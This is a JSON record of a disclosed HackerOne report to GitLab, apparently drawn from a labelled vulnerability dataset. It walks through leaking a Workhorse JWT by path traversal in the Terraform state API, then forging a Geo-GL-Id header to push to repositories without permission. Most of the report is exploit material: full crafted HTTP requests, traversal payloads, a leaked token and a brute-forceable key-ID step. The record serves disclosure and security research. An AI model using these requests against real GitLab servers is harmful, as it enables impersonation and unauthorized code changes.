{
  "reported_to": "GitLab",
  "reported_by": "ledz1996 ",
  "title": "Exposure of a valid Gitlab-Workhorse JWT leading to various bad things",
  "content": "\nSummary\nUsing the State Uploading API we could potentially do a bad thing:\nBypass Gitlab::Workhorse.verify_api_request!\nThis was due to the fact that Workhorse clean the URL before passing it to Rails, this is elaborated in #923027.\nand State Api read request.body to append it as a file!\nlib/api/terraform/state.rb\nCode 287 Bytes\n1 desc 'Add a new terraform state or update an existing one'\n2          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth\n3          post do\n4            authorize! :admin_terraform_state, user_project\n5\n6            data = request.body.read\nThere is one very interestingly specific exploit which I've found in my researching on Geo is to un-authorizing push to any readable repository\nSince Gitlab has a pre-receive hook which check the permission even if attacker is able to bypass the Access Control in Rails part but here is pretty interesting stuff in EE:\nee/app/controllers/ee/repositories/git_http_controller.rb\nCode 167 Bytes\n1def user\n2        super || geo_push_user&.user\n3      end\n4\n5      def geo_push_user\n6        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)\n7      end\nWhich mean the user for passing to Gitaly will be user from geo_push_user\nCode 187 Bytes\n1  def self.new_from_headers(headers)\n2    return unless needed_headers_provided?(headers)\n3\n4    new(headers['Geo-GL-Id'])\n5  end\n6\n7  def user\n8    @user ||= identify_using_ssh_key(gl_id)\n9  end\nTracing from this we will reach here\nCode 192 Bytes\n1    def identify_using_ssh_key(identifier)\n2      key_id = identifier.gsub(\"key-\", \"\")\n3\n4      identify_with_cache(:ssh_key, key_id) do\n5        User.find_by_ssh_key_id(key_id)\n6      end\n7    end\n8\nThis means: I am able to authenticate as any SSH-KEY by just passing the ID of the Key to headers Geo-GL-Id\nSteps to reproduce\nSpliting into 2 parts, GEO is not neccessary for the PoC but EE Plan should be.\nExposing Gitlab JWT\nSet up an Project\nGet a Personal Access Token of the user\nSend the following request\nCode 1.45 KiB\n1POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1\n2Host: gitlab3.example.vm\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\n4Private-Token: <private-token>\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Connection: close\n9Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW\n10Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\n11Upgrade-Insecure-Requests: 1\n12Content-Length: 316\n13\n14------WebKitFormBoundaryTdc8IV2vpQMwv6jW\n15Content-Disposition: form-data; name=\"import_url\"\n16\n17http://gitlab3.example.vm/test/ttt\n18------WebKitFormBoundaryTdc8IV2vpQMwv6jW\n19Content-Disposition: form-data; name=\"mirror\"; filename=test.txt\n20Content-Type: image/jpg\n21\n22true\n23------WebKitFormBoundaryTdc8IV2vpQMwv6jW--\nLater on send the following request\nCode 1.00 KiB\n1GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1\n2Host: gitlab3.example.vm\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0\n4Private-Token: <Private-Token>\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Connection: close\n9Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all\n10Upgrade-Insecure-Requests: 1\n11\nYou will then receive something like this which the JWT is in mirror.gitlab-workhorse-upload parameter\nCode 2.84 KiB\n1HTTP/1.1 200 OK\n2Server: nginx\n3Date: Sun, 22 Nov 2020 17:45:01 GMT\n4Connection: close\n5Cache-Control: max-age=0, private, must-revalidate\n6Etag: W/\"2db9b0c1229e01c96956b4ed4ed32f3d\"\n7Vary: Origin\n8X-Content-Type-Options: nosniff\n9X-Frame-Options: SAMEORIGIN\n10X-Request-Id: wNp4wblZQ42\n11X-Runtime: 0.119849\n12Strict-Transport-Security: max-age=31536000\n13Referrer-Policy: strict-origin-when-cross-origin\n14Content-Length: 2540\n15\n16--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n17Content-Disposition: form-data; name=\"import_url\"\n18\n19http://gitlab3.example.vm/test/ttt\n20--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n21Content-Disposition: form-data; name=\"mirror.name\"\n22\n23test.txt\n24--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n25Content-Disposition: form-data; name=\"mirror.path\"\n26\n27/opt/gitlab/embedded/service/gitlab-rails/public/uploads/tmp/test.txt403239251\n28--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n29Content-Disposition: form-data; name=\"mirror.md5\"\n30\n31b326b5062b2f0e69046810717534cb09\n32--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n33Content-Disposition: form-data; name=\"mirror.sha256\"\n34\n35b5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b\n36--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n37Content-Disposition: form-data; name=\"mirror.gitlab-workhorse-upload\"\n38\n39eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\n40--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n41Content-Disposition: form-data; name=\"mirror.remote_id\"\n42\n43\n44--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n45Content-Disposition: form-data; name=\"mirror.size\"\n46\n474\n48--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n49Content-Disposition: form-data; name=\"mirror.remote_url\"\n50\n51\n52--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n53Content-Disposition: form-data; name=\"mirror.sha512\"\n54\n559120cd5faef07a08e971ff024a3fcbea1e3a6b44142a6d82ca28c6c42e4f852595bcf53d81d776f10541045abdb7c37950629415d0dc66c8d86c64a5606d32de\n56--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a\n57Content-Disposition: form-data; name=\"mirror.sha1\"\n58\n595ffe533b830f08a0326348a9160afafc8ada44db\n60--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a--\n61\nTake note of this value\nUnauthorizing push to readable project\nAssuming:\nUser B has Project B set public or internal without any user can push.\nUser B upload an SSH-KEY.\nLogin as another user.\nNavigate to project B that you don't have the push access.\nFork the project\nClone the forked project using HTTP\nPush any file to the Project but intercept the request\nWhen sending the request to <project-forked-path>.git/git-receive-pack\nChange the path from <project-forked-path>.git/git-receive-pack to /-/push_from_secondary/2/<project-path>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack\nAdding the Gitlab-Workhorse-Api-Request Header with the value is the value noted in the first part\nAdding the Geo-GL-Id with the value key-<id> with <id> as the ID of any key of a user who has push access to the project which is user B, This could be brute-forced as it is incremental integer from 1.\nThe request should look likes\nCode 1.49 KiB\n1POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1\n2Host: gitlab3.example.vm\n3Geo-GL-Id: key-1\n4User-Agent: git/2.28.0\n5Accept-Encoding: gzip, deflate\n6Gitlab-Workhorse-Api-Request: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0\n7Content-Type: application/x-git-receive-pack-request\n8Accept: application/x-git-receive-pack-result\n9Content-Length: 436\n10Connection: close\n11\n1200a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACK\u0002\u0003\u009f\fx\u009c\u0095\u00cbA\n13B!\u0010\u00d0\u00bd\u00a7p\u001f\u0084\u00f3\u00f5;\u000eDt\u0082\u00f6-gt\u00a2 \u00f3c\n14u\u00fb\u00baB\u00db\u0007otU[\"\u0088 q\u0080(IY\u00d0\u00ab\u008bEs\u0086E\u00a8d\u00cc(\u00b4*\u0093\u00d9\u00b8\u00ebs\u00d8e\u00c9\u0019\u00a3rJ\u00de\u0007\u0080\u0080\f\u008eK\u00f2W\"\n15\"\u00c4\u0089\n16R!\u00c3s\u00dcZ\u00b7\u00976\u00bb=sU{\u00f8\u00b4y\u00d27\u00d7\u00ed\u00a1\u00fb\u00dc\u00ea\u00d1Bt\u00d1!\u00f8\u00b0\u00da\u009dC\u00e7\u00ccO\u00eb}\f\u00fd\u00b3\u0099\u00a1\u00afa\u00bek\u00e5=\u00d5\u00fa\u0002s\u000eVO\u00e6\u0001me\u00b26\n17\bAz^\u00d7\u00ff\u000e\u00dcTx\u009c\u0001*\u00d5\u00ff\u0094\u0002\u00bb\u0002\u0090\u00d3 lll2332.txt\u00a8'F\u00dbN^\u00c1\u00ceZ\u00d0p\u00e5}\u00cd\"\u00b6\u00dc\u00bf\u00b3\u00d0\u0091\u00ccHt!\u0014\u00024x\u009c+))\u00e1\u0002\u0004\"\u0001g\u00f8\u00c8\u00ce.LG^g\u00dfyg\u0019\u00df\u00ff\f\u008d\u00e65,\nVideo:\nSorry had to tone down the size because of 256 mb limit :(\nResults of GitLab environment info\nCode 913 Bytes\n1System information\n2System:     Ubuntu 16.04\n3Proxy:      no\n4Current User:   git\n5Using RVM:  no\n6Ruby Version:   2.6.6p146\n7Gem Version:    2.7.10\n8Bundler Version:1.17.3\n9Rake Version:   12.3.3\n10Redis Version:  5.0.9\n11Git Version:    2.28.0\n12Sidekiq Version:5.2.9\n13Go Version: unknown\n14\n15GitLab information\n16Version:    13.5.3-ee\n17Revision:   b9d194b6b91\n18Directory:  /opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter: PostgreSQL\n20DB Version: 11.9\n21URL:        http://gitlab.example.vm\n22HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\n23SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\n24Elasticsearch:  no\n25Geo:        no\n26Using LDAP: no\n27Using Omniauth: yes\n28Omniauth Providers:\n29\n30GitLab Shell\n31Version:    13.11.0\n32Repository storage paths:\n33- default:  /var/opt/gitlab/git-data/repositories\n34GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\n35Git:        /opt/gitlab/embedded/bin/git\nImpact\nUnauthorized push to repositories, exposing Workhorse JWT\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1000,
  "weaknesses": [
    "Improper Authentication - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1657052880,
  "report_url": "https://hackerone.com/reports/1040786",
  "vuln_category": "API",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "steps": [
    [
      1,
      "Expose Gitlab JWT by sending a crafted request to the Terraform state API endpoint with path traversal to access the JWT token."
    ],
    [
      2,
      "Use the exposed JWT to bypass authentication by manipulating the Geo-GL-Id header to impersonate any user with an SSH key, allowing unauthorized pushes to repositories."
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to expose a valid Gitlab-Workhorse JWT through path traversal in the Terraform state API, and then use this JWT to bypass authentication checks by manipulating the Geo-GL-Id header to impersonate users with SSH keys, leading to unauthorized repository pushes.",
  "reason": "The attack involves multiple complex components including path traversal to expose the JWT, understanding the Geo push user authentication mechanism, and manipulating HTTP headers to bypass authentication. The interaction between these components is subtle and non-obvious, requiring deep knowledge of Gitlab's internal workings.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "#923027",
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": true
  }
}